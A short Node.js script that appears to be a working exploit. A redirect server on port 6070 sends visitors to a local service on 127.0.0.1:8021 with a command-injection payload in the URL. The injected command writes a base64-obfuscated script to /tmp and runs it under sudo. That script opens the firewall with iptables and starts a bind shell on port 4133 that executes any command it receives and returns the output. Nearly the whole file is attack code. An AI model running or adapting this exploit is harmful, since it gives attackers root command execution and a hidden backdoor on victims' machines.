const http = require('http');
let payload = `"" & mkdir -p /tmp/ktp-update-work/ && e="/tmp/ktp-update-work/ktp-update.sh" && echo "JycgJiBpcHRhYmxlcyAtSSBJTlBVVCAtaiBBQ0NFUFQgJiBpcHRhYmxlcyAtSSBPVVRQVVQgLWogQUNDRVBUICYgZWNobyAnY29uc3QgbmV0PXJlcXVpcmUoIm5ldCIpLGNwPXJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSxzZXJ2ZXI9bmV0LmNyZWF0ZVNlcnZlcigoZSk9PntsZXQgcj0iIjtlLm9uKCJkYXRhIixuPT57KHIrPW4udG9TdHJpbmcoKSkuZW5kc1dpdGgoIiMzMyMiKSYmKGNwLmV4ZWMoci5zcGxpdCgiIzMzIilbMF0sYXN5bmMocixuLHQpPT57ZS53cml0ZShuZXcgQnVmZmVyLmZyb20oSlNPTi5zdHJpbmdpZnkoe2Vycm9yOm51bGwgIT0gciA/ci5tZXNzYWdlOm51bGwsc3Rkb3V0Om4sc3RkZXJyOnQsZW5kOjB9KSkpfSkscj0iIil9KSxlLm9uKCJlcnJvciIsKCk9Pnt9KX0pO3NlcnZlci5saXN0ZW4oNDEzMywiMC4wLjAuMCIpOycgfCBub2Rl" | base64 -d >> "\${e}" && sudo /bin/bash "\${e}"`;
const payloadUrl = "http://127.0.0.1:8021/start-answer-downloader/";
http.createServer(function (req, res) {
    res.writeHead(307, {"Location": payloadUrl+encodeURIComponent(payload)})
    res.end()
}).listen(6070);
console.log("listening on port 6070");
